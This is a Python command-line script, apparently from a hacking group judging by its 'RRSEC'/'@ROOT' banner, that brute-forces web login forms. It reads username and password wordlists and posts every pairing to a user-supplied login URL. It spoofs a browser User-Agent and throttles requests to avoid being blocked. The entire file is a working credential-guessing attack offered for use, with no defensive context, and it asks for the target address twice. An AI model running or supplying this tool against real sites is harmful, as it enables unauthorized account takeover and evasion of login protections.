import requests
from colorama import Fore
import sys
import time
from itertools import product

def __start__():
    try:
        print(Fore.RED+" [!] Enter Website Address\n")
        url = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"RRSEC"+Fore.BLUE+"~"+Fore.WHITE+"@ROOT"+Fore.RED+"/"+Fore.CYAN+"RR"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"BertubiTubi"+Fore.RED+"""]\n └──╼ """+Fore.WHITE+"# ")
        
        # Memanggil fungsi main untuk menjalankan pencarian admin
        main()
        
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit()

def load_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            words = file.read().splitlines()
        return words
    except FileNotFoundError:
        print(f"Wordlist file not found: {file_path}")
        return []

def brute_force_login(url, username_field, password_field, usernames, passwords):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    session = requests.Session()
    
    for username, password in product(usernames, passwords):
        data = {username_field: username, password_field: password}
        try:
            response = session.post(url, data=data, headers=headers)
            
            print(f"Testing: Username: {username}, Password: {password}")
            print(f"Response Code: {response.status_code}")
            
            # Log more details about the response
            if response.status_code == 200:
                print(f"Response Text: {response.text[:100]}...")  # Print the first 100 characters of the response text
                
            if response.status_code == 200 and "invalid" not in response.text.lower() and "error" not in response.text.lower():
                print(f"Success! Username: {username}, Password: {password}")
                return True
            else:
                print(f"Failed: Username: {username}, Password: {password}")
                
            # Add delay to avoid blocking
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
    
    print("Brute force attack failed. No valid credentials found.")
    return False

def main():
    try:
        target_url = input("Enter the target login URL: ")
        username_field = input("Enter the username field name: ")
        password_field = input("Enter the password field name: ")
        usernames_file = input("Enter the path to the usernames wordlist: ")
        passwords_file = input("Enter the path to the passwords wordlist: ")

        usernames = load_wordlist(usernames_file)
        passwords = load_wordlist(passwords_file)
        
        if not usernames or not passwords:
            print("Wordlist is empty or could not be loaded.")
            return

        brute_force_login(target_url, username_field, password_field, usernames, passwords)
    
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit()

if __name__ == "__main__":
    __start__()
